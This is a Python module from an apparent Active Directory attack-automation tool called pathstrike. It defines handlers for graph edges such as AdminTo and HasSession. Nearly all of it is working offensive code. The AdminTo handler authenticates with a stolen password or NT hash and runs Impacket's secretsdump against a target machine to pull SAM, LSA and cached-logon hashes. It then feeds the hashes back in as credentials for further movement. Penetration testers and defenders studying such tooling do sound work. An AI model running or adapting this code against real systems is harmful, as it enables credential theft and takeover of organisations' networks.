"""Computer access edge exploitation handlers.

Handles AdminTo (local admin access) and HasSession (informational session
edge) relationships.
"""

from __future__ import annotations

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("AdminTo")
class AdminToHandler(BaseEdgeHandler):
    """Handles AdminTo edges.

    The principal has local administrator access on the target computer.
    This handler uses Impacket's ``secretsdump.py`` to extract local
    credential hashes (SAM, LSA secrets, cached domain logons) from the
    target machine.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "computer":
            return False, f"AdminTo requires a Computer target, got {edge.target.label}"

        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        has_cred = self.cred_store.get_best_credential(principal, domain) is not None
        if not has_cred:
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, f"No credential for admin user {principal}"

        return True, f"{principal} has admin access on {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_host = edge.target.properties.get("ip_address") or target
        domain = self._get_domain()
        dc_ip = self._get_dc_host()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would run secretsdump against {target_host} as {principal}",
                [],
            )

        self.logger.info(
            "Running secretsdump against %s as %s", target_host, principal
        )

        _target_str, auth_flags = self._get_impacket_auth(principal)

        # Determine password/hash
        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.secretsdump(
            target=target_host,
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
            just_dc=False,  # Full dump: SAM + LSA + cached logons
            timeout=120,
        )

        if not result["success"]:
            return (
                False,
                f"secretsdump failed on {target_host}: {result.get('error', 'unknown')}",
                [],
            )

        hashes: dict[str, str] = result.get("hashes", {})
        new_creds: list[Credential] = []

        for user, nt in hashes.items():
            # Determine whether this is a local or domain credential
            cred_domain = target if "\\" not in user else domain
            clean_user = user.split("\\")[-1] if "\\" in user else user

            new_creds.append(
                Credential(
                    cred_type=CredentialType.nt_hash,
                    value=nt,
                    username=clean_user,
                    domain=cred_domain,
                    obtained_from=f"secretsdump on {target_host} (AdminTo)",
                )
            )

        return (
            True,
            f"secretsdump on {target_host}: extracted {len(hashes)} hashes",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # secretsdump is read-only; no rollback needed.
        return None


@register_handler("HasSession")
class HasSessionHandler(BaseEdgeHandler):
    """Handles HasSession edges.

    HasSession is an informational edge indicating that the target user
    has an active session on the source computer.  This is primarily
    useful for indicating that credentials *might* be extractable if
    we gain admin access to that computer.

    The handler operates as a pass-through: it succeeds immediately
    without performing any exploitation.  If the engine already has
    admin access to the computer (via a prior AdminTo step), credential
    extraction would have been done there.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, (
            f"HasSession: {edge.target.name} has session on {edge.source.name} "
            "(informational)"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        source = self._resolve_principal(edge)
        target = self._resolve_target(edge)

        self.logger.info(
            "HasSession pass-through: %s has session on %s", target, source
        )

        return (
            True,
            f"HasSession noted: {target} has session on {source}. "
            f"Credential extraction depends on admin access to {source}.",
            [],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # No changes made; nothing to roll back.
        return None
